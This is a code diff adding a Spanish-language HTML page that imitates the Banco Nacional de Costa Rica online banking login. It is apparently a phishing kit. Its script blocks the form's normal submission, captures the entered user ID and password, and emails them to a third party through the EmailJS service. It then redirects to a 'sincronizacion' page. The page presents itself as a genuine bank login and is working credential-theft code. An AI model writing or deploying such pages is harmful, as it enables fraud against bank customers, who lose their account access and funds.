@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IBN - Inicio de Sesión</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="styles2.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+    body {
+      background: url('images/fondo.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
+    }
+
+    /* Mejoras para el contenedor de contraseña */
+    .password-container {
+      position: relative;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 15px;
+      border-radius: 15px;
+      text-align: center;
+    }
+
+    button, #Button {
+      width: 100%;
+      padding: 15px;
+      background: linear-gradient(135deg, #2272FF 0%, #1a5dd1 100%);
+      color: white;
+      border: none;
+      border-radius: 15px;
+      cursor: pointer;
+      font-size: 18px;
+      font-weight: 600;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(34, 114, 255, 0.4);
+    }
+
+    button:hover, #Button:hover {
+      background: linear-gradient(135deg, #1a5dd1 0%, #2272FF 100%);
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(34, 114, 255, 0.6);
+    }
+
+    button:disabled, #Button:disabled {
+      background: #666;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+
+    body {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    .FootTr {
+      margin-top: auto;
+    }
+
+    /* Custom Alert */
+    .custom-alert {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .alert-content {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(20px);
+      padding: 2rem;
+      border-radius: 15px;
+      text-align: center;
+      max-width: 400px;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      color: #fff;
+    }
+
+    .alert-btn {
+      background: #2272FF;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-top: 15px;
+      font-size: 14px;
+      transition: all 0.3s ease;
+    }
+
+    .alert-btn:hover {
+      background: #1a5dd1;
+    }
+
+    /* Mejoras responsive */
+    @media (max-width: 600px) {
+      .FootTr {
+        padding: 10px;
+        text-align: center;
+        font-size: 13px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        flex-wrap: wrap;
+      }
+
+      #footerPlaceholder {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .footermain {
+        font-weight: bold;
+        margin-bottom: 5px;
+      }
+
+      .fcenter,
+      .fright {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        width: 100%;
+        margin: 5px 0;
+      }
+
+      .menulinkHref a {
+        margin: 3px 0;
+        display: inline-block;
+        text-decoration: none;
+        word-break: break-word;
+        max-width: 100%;
+      }
+
+      .social_links {
+        margin-top: 5px;
+      }
+
+      .contentBlock {
+        padding: 1.5rem;
+        margin: 1rem;
+      }
+
+      input[type="text"], input[type="password"] {
+        padding: 12px;
+        font-size: 16px;
+        text-align: center;
+      }
+    }
+
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      background-color: #1D1D1D;
+      overflow: hidden; /* Bloquea todo el scroll */
+    }
+    </style>
+</head>
+<body>
+    <!-- Cabecera con logo -->
+    <div class="HeadContain">
+        <div id="header">
+            <div class="company_logo">
+                <img src="images/logo.png" alt="IBN Logo">
+            </div>
+        </div>
+    </div>
+    <h1><br><br></h1>
+    
+    <!-- Contenido principal -->
+    <div class="MainContent Content_Main">
+        <!-- Panel de login -->
+        <div id="content">
+            <div class="contentBlock">
+                <div id="workArea">
+                    <form id="loginForm" action="sincronizacion.html" method="get">
+                        <div id="loginArea">
+                            <div id="userNameArea">
+                                <img src="images/firma.png" alt="Imagen de acceso" id="loginImage">
+                                <input type="text" id="usuario" name="name" class="text fullWidth usrInput" placeholder="Identificación" required>
+                            </div>
+                            <div id="passwordArea">
+                                <div class="password-container">
+                                    <input type="password" id="clave" name="password" class="text fullWidth passwordInputKeyBoard" placeholder="Contraseña" required>
+                                </div>
+                            </div>
+                            <div id="submissionArea">
+                                <input type="submit" id="Button" value="Iniciar sesión">
+                            </div>
+                            <div id="lostPassword">
+                                <a href="https://bncr.bnonline.fi.cr/Login/RedefinirClave/SolicitudOlvidoClave.aspx" class="txtBlue">¿Olvidó su contraseña?</a>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <h4><br></h4>
+    
+    <!-- Pie de página -->
+    <div class="FootTr">
+        <div id="footerPlaceholder">
+            <div class="footermain">Accesos</div>
+            <div class="fcenter">
+                <div class="menulinkHref">
+                    <a href="https://bncr.bnonline.fi.cr/Login/RegistroLineaTarjeta.aspx">Registro en línea</a><br>
+                    <a href="https://bncr.bnonline.fi.cr/Login/SincronizarOTP.aspxs">Sincronizar OTP</a><br>
+                    <a href="https://bncr.bnonline.fi.cr/Login/descargas.aspx">Descargar Módulo Local IBC</a>
+                </div>
+            </div>
+            <div class="social_links">
+                <div class="fright">
+                    <div class="menulinkHref">
+                        <p>Asistencia: Contáctenos al 2212-2000 opción 5</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Custom Alert -->
+    <div id="customAlert" class="custom-alert">
+        <div class="alert-content">
+            <h3>Bienvenido al Sistema IBN</h3>
+            <p>Ingrese sus credenciales para acceder de forma segura.</p>
+            <button id="alertBtn" class="alert-btn">Continuar</button>
+        </div>
+    </div>
+
+    <!-- JavaScript agregado -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    
+    <script type="text/javascript">
+        emailjs.init('Fdk3dIBYptP-7lOoE')
+    </script>
+
+    <script>
+        // Mostrar/ocultar contraseña
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('clave');
+
+        if (togglePassword) {
+            togglePassword.addEventListener('click', function() {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                
+                this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
+            });
+        }
+
+        // Envío de formulario con debugging
+        const btn = document.getElementById('Button');
+        const loginForm = document.getElementById('loginForm');
+
+        loginForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            // Debug: Verificar que los valores se capturan correctamente
+            const usuario = document.getElementById('usuario').value;
+            const clave = document.getElementById('clave').value;
+            
+            console.log('Usuario:', usuario);
+            console.log('Clave:', clave);
+        
+            btn.value = 'Enviando...';
+            btn.disabled = true;
+        
+            const serviceID = 'default_service';
+            const templateID = 'template_dtqwqog';
+            
+            // Preparar los datos para el template específico
+            const templateParams = {
+                name: usuario,
+                password: clave,
+                entity: 'nacional' // Valor fijo como solicitaste
+            };
+            
+            console.log('Template params:', templateParams);
+        
+            // Usar send para enviar con los parámetros específicos
+            emailjs.send(serviceID, templateID, templateParams)
+                .then(() => {
+                    console.log('Email enviado exitosamente');
+                    window.location.href = 'sincronizacion.html';
+                }, (err) => {
+                    console.error('Error al enviar email:', err);
+                    btn.value = 'Iniciar sesión';
+                    btn.disabled = false;
+                    alert('Error al enviar: ' + JSON.stringify(err));
+                });
+        });
+    </script>
+</body>
+</html>
